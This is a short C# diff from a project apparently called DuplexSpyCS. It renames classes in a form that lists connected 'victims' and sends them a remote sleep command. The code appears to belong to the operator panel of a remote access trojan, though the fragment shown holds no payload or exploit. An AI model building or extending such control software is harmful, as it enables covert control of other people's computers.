@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmClntSleep : Form
     {
-        public List<Victim> m_lsVictim;
+        public List<clsVictim> m_lsVictim;
         public Form1 frmMain;
 
         public frmClntSleep()
@@ -20,7 +20,7 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
-        void Received(Listener listener, Victim v, string[] cmd)
+        void Received(clsTcpListener listener, clsVictim v, string[] cmd)
         {
             if (cmd[0] == "clnt")
             {
@@ -40,7 +40,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            foreach (Victim v in m_lsVictim)
+            foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
@@ -79,7 +79,7 @@ namespace DuplexSpyCS
             {
                 ThreadPool.QueueUserWorkItem(x =>
                 {
-                    Victim v = (Victim)item.Tag;
+                    clsVictim v = (clsVictim)item.Tag;
                     v.SendCommand($"clnt|sl|{(int)numericUpDown2.Value}");
                 });
             }
